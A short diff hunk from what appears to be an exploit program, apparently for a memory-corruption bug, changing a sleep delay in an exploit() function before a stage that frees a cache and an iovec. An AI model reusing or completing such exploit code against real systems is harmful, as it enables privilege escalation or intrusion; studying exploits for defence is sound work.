@@ -895,7 +895,7 @@ void exploit(void) {
   read(signal_pipes[0], data, 1);
   assert(data[0] == 'S');
   // sleep for a while making sure the memory is freed
-  usleep(100 * 1000);
+  usleep(1000 * 1000);
 
   printf("[*] STAGE 3: free the cache\n");
   // now free the iov
